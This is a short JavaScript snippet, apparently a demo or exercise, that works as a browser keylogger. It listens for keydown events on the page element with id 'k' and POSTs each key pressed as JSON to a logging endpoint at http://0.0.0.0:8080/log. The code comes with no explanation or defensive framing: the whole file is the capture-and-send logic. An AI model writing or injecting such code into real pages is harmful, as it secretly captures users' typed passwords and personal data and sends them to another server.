
const element = document.getElementById("k");
let output = ''
element.addEventListener("keydown", function(event){
    console.log(event);
    output = event.key

    const outcome = {message: output} 
    fetch("http://0.0.0.0:8080/log", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(
                outcome
            )
    }) 
})

